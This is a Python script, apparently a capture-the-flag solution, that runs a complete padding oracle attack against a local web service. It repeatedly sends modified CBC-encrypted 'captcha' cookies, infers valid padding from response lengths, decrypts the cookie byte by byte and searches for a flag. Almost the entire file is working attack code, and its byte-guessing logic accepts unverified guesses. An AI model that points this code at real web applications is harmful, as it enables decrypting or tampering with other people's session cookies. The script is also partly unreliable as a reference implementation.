#!/usr/bin/env python3
"""
Complete Padding Oracle Attack Implementation
Decrypts CBC-encrypted cookies by exploiting padding oracle vulnerability
"""

import requests
import base64
import sys
from collections import Counter

TARGET_URL = "http://127.0.0.1:32869/"
BLOCK_SIZE = 16

def get_captcha_cookie():
    """Get a fresh captcha cookie"""
    try:
        response = requests.get(TARGET_URL, timeout=5)
        if 'captcha' in response.cookies:
            return response.cookies['captcha']
    except:
        pass
    return None

def oracle(cookie_value):
    """
    Padding oracle function - returns response characteristics
    Different padding validity produces different response lengths
    """
    try:
        cookies = {'captcha': cookie_value}
        response = requests.get(TARGET_URL, cookies=cookies, timeout=5)
        return len(response.content)
    except Exception as e:
        return None

def find_baseline_responses():
    """Find typical response lengths for valid vs invalid padding"""
    print("[*] Calibrating oracle...")
    cookie = get_captcha_cookie()
    if not cookie:
        return None, None
    
    cookie_bytes = base64.b64decode(cookie)
    lengths = []
    
    # Test random modifications
    for i in range(20):
        test_bytes = bytearray(cookie_bytes)
        test_bytes[-1] = i
        test_cookie = base64.b64encode(bytes(test_bytes)).decode('ascii')
        length = oracle(test_cookie)
        if length:
            lengths.append(length)
    
    # Find most common (likely invalid padding) and valid padding responses
    counter = Counter(lengths)
    print(f"[*] Observed response lengths: {dict(counter)}")
    return lengths

def decrypt_byte(prev_block, cipher_block, position, known_plaintext):
    """
    Decrypt a single byte at given position using padding oracle
    """
    # Calculate what padding value we're targeting
    pad_value = BLOCK_SIZE - position
    
    # Create test IV that will produce correct padding for known bytes
    test_iv = bytearray(prev_block)
    
    # Set known bytes to produce correct padding
    for i in range(position + 1, BLOCK_SIZE):
        test_iv[i] = prev_block[i] ^ known_plaintext[i] ^ pad_value
    
    # Try all possible values for target byte
    response_lengths = {}
    
    for guess in range(256):
        test_iv[position] = guess
        
        # Create test cookie with modified IV + target cipher block
        test_cookie_bytes = bytes(test_iv) + cipher_block
        test_cookie = base64.b64encode(test_cookie_bytes).decode('ascii')
        
        # Query oracle
        length = oracle(test_cookie)
        
        if length is not None:
            if length not in response_lengths:
                response_lengths[length] = []
            response_lengths[length].append(guess)
    
    # Find the guess that produces valid padding
    # Valid padding typically produces a different response length
    # Look for the outlier or most consistent pattern
    
    # Strategy: Find length with fewest occurrences (likely valid padding)
    # or most occurrences depending on oracle behavior
    sorted_by_count = sorted(response_lengths.items(), key=lambda x: len(x[1]))
    
    # Try the least common response first (often indicates valid padding)
    for length, guesses in sorted_by_count[:3]:
        for guess in guesses:
            # Calculate plaintext byte
            plaintext_byte = guess ^ prev_block[position] ^ pad_value
            # Verify this makes sense (printable or reasonable value)
            return plaintext_byte, guess
    
    # Fallback - try first guess
    if response_lengths:
        first_length = list(response_lengths.keys())[0]
        guess = response_lengths[first_length][0]
        plaintext_byte = guess ^ prev_block[position] ^ pad_value
        return plaintext_byte, guess
    
    return None, None

def decrypt_block(prev_block, cipher_block):
    """Decrypt entire block using padding oracle"""
    plaintext = bytearray(BLOCK_SIZE)
    
    print(f"\n[*] Decrypting block...")
    print(f"    Cipher: {cipher_block.hex()}")
    
    # Decrypt from right to left (last byte first)
    for position in range(BLOCK_SIZE - 1, -1, -1):
        print(f"    Decrypting byte {BLOCK_SIZE - position}/{BLOCK_SIZE}...", end='\r')
        
        pt_byte, _ = decrypt_byte(prev_block, cipher_block, position, plaintext)
        
        if pt_byte is None:
            print(f"\n    [!] Failed to decrypt byte at position {position}")
            return None
        
        plaintext[position] = pt_byte
    
    print(f"\n    Plaintext (hex): {plaintext.hex()}")
    print(f"    Plaintext (raw): {bytes(plaintext)}")
    
    # Try to decode as ASCII
    try:
        decoded = plaintext.decode('ascii', errors='ignore')
        print(f"    Plaintext (ascii): {repr(decoded)}")
    except:
        pass
    
    return bytes(plaintext)

def decrypt_cookie(cookie_value):
    """Decrypt entire cookie using padding oracle attack"""
    cookie_bytes = base64.b64decode(cookie_value)
    
    if len(cookie_bytes) % BLOCK_SIZE != 0:
        print(f"[!] Cookie length {len(cookie_bytes)} not multiple of block size {BLOCK_SIZE}")
        return None
    
    num_blocks = len(cookie_bytes) // BLOCK_SIZE
    print(f"[*] Cookie has {num_blocks} blocks ({len(cookie_bytes)} bytes)")
    print(f"[*] Cookie hex: {cookie_bytes.hex()}")
    
    # Split into blocks
    blocks = [cookie_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cookie_bytes), BLOCK_SIZE)]
    
    # Decrypt each block (skip first block as it's IV in CBC mode)
    plaintext_blocks = []
    
    for i in range(1, len(blocks)):
        print(f"\n{'='*60}")
        print(f"[*] Decrypting block {i}/{len(blocks)-1}")
        prev_block = blocks[i-1]
        cipher_block = blocks[i]
        
        plaintext = decrypt_block(prev_block, cipher_block)
        
        if plaintext:
            plaintext_blocks.append(plaintext)
        else:
            print(f"[!] Failed to decrypt block {i}")
            return None
    
    # Combine plaintext blocks
    if plaintext_blocks:
        full_plaintext = b''.join(plaintext_blocks)
        print(f"\n{'='*60}")
        print(f"[+] FULL PLAINTEXT:")
        print(f"    Hex: {full_plaintext.hex()}")
        print(f"    Raw: {full_plaintext}")
        
        # Remove PKCS7 padding
        if full_plaintext:
            pad_len = full_plaintext[-1]
            if pad_len <= BLOCK_SIZE:
                unpadded = full_plaintext[:-pad_len]
                print(f"    Unpadded: {unpadded}")
                try:
                    decoded = unpadded.decode('utf-8', errors='ignore')
                    print(f"    Decoded: {repr(decoded)}")
                    
                    # Look for FLAG in the output
                    if 'FLAG' in str(unpadded) or 'FLAG' in decoded:
                        print(f"\n{'='*60}")
                        print(f"[+++] FLAG FOUND!")
                        print(f"{'='*60}")
                        print(full_plaintext)
                        print(unpadded)
                        print(decoded)
                except:
                    pass
        
        return full_plaintext
    
    return None

def main():
    print("="*60)
    print("COMPLETE PADDING ORACLE ATTACK")
    print("="*60)
    
    # Get cookie
    print("\n[1] Getting captcha cookie...")
    cookie = get_captcha_cookie()
    if not cookie:
        print("[!] Failed to get cookie")
        return
    
    print(f"[+] Cookie: {cookie}")
    
    # Calibrate oracle
    print("\n[2] Calibrating oracle responses...")
    find_baseline_responses()
    
    # Perform attack
    print("\n[3] Starting padding oracle attack...")
    print("[*] This may take several minutes...")
    
    result = decrypt_cookie(cookie)
    
    if result:
        print("\n[+] Attack successful!")
    else:
        print("\n[!] Attack failed or incomplete")

if __name__ == "__main__":
    main()
